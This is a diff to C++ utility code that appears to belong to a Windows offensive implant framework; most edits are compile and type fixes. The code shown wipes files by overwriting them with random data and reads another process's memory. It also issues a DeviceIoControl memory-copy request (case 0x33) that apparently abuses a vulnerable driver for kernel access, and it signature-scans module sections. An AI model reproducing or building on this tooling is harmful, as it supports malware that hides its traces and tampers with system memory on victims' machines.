@@ -7,7 +7,7 @@ namespace Utils {
 	BOOL WriteToDisk(const wchar_t *path, const uint8_t* data, size_t size) {
 		HEXANE;
 
-		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (handle == INVALID_HANDLE_VALUE) {
 			return false;
 		}
@@ -30,22 +30,26 @@ namespace Utils {
 		DWORD read = 0;
 		BOOL result = ctx->win32.ReadFile(handle, data, (DWORD) size, &read, NULL);
 
-		ctx->win32.CloseHandle(handle);
+		ctx->win32.NtClose(handle);
 		return (result && read == size);
 	}
 
 	BOOL DestroyFileData(const wchar_t* path, size_t size) {
 		HEXANE;
 
-		bool success = false;
+		bool success     = false;
+		uint8 *rand_data = nullptr;
+		int new_length   = 0;
+
+		DWORD write = 0;
 		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (handle == INVALID_HANDLE_VALUE) {
 			goto defer;
 		}
 
-		int new_length = size + ((long long) RandomNumber32() * (long long) RandomNumber32()) % 2000000 + 1000;
+		new_length = size + ((long long) RandomNumber32() * (long long) RandomNumber32()) % 2000000 + 1000;
 	
-		uint8* rand_data = (uint8*) ctx->win32.RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, new_length);
+		rand_data = (uint8*) ctx->win32.RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, new_length);
 		if (!rand_data) {
 			ctx->win32.NtClose(handle);
 			goto defer;
@@ -54,8 +58,6 @@ namespace Utils {
 		for (size_t i = 0; i < new_length; i++) {
 			rand_data[i] = (uint8)(RandomNumber32() % 255);
 		}
-
-		DWORD write = 0;
 		if (!ctx->win32.WriteFile(handle, rand_data, new_length, &write, NULL) || write != new_length) {
 			//Log(L"[!] Error dumping data on disk");
 			goto defer;
@@ -80,7 +82,7 @@ namespace Utils {
 		uintptr_t instr = (uintptr_t) offset;
 		int32 rip_offset = 0;
 
-		if (!NT_SUCCESS(ntstatus = ctx->win32.NtReadVirtualMemory(handle, instr + offset_offset, &rip_offset, sizeof(int32), nullptr))) {
+		if (!NT_SUCCESS(ntstatus = ctx->win32.NtReadVirtualMemory(handle, (void*)instr + offset_offset, &rip_offset, sizeof(int32), nullptr))) {
 			return nullptr;
 		}
 
@@ -124,11 +126,11 @@ namespace Utils {
 		DWORD read = 0;
 
 		buffer.case_number = 0x33;
-		buffer.source = src;
-		buffer.destination = dst;
+		buffer.source = (uintptr_t) src;
+		buffer.destination = (uintptr_t) dst;
 		buffer.length = size;
 
-		return ctx->win32.DeviceIoControl(handle, ioctl1, &buffer, sizeof(buffer), nullptr, 0, &read, nullptr);
+		return ctx->win32.DeviceIoControl(handle, IOCTL1, &buffer, sizeof(buffer), nullptr, 0, &read, nullptr);
 	}
 
     namespace Scanners {
@@ -201,10 +203,11 @@ namespace Utils {
 		UINT_PTR SignatureScanSection(HANDLE handle, const char *sec_name, uintptr_t base, const char *signature, const char *mask) {
 
 			uint32 size = 0;
-			uintptr_t section = FindSection(handle, sec_name, base, &size);
+			uintptr_t section = FindSection(sec_name, base, &size);
 			if (!section) {
 				return 0;
 			}
+
 			return SignatureScan(handle, section, size, signature, mask);
 		}
     }
